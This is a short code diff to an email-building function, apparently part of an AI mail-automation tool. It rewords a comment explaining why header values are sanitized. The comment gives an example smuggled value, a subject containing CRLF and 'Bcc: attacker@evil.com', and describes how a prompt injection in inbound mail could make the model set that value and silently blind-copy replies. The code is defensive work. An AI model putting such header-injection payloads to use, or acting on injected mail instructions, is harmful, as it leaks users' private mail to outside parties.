@@ -40,7 +40,7 @@ function buildRawMessage({ to, cc, bcc, subject, body, userEmail = '', inReplyTo
     // come from model arguments (which an automation over inbound mail lets a
     // prompt injection choose), and In-Reply-To/References are lifted off the
     // untrusted message being replied to. A bare CR or LF therefore starts a
-    // new header — `subject: "Re: invoice\r\nBcc: attacker@evil.com"` used to
+    // new header — `subject: "Re: invoice\r\nBcc: attacker@evil.com"` would
     // produce a real Bcc that messages.send honours, blind-copying the reply
     // with no approval step on the autoSend path.
     to = sanitizeHeaderValue(to);
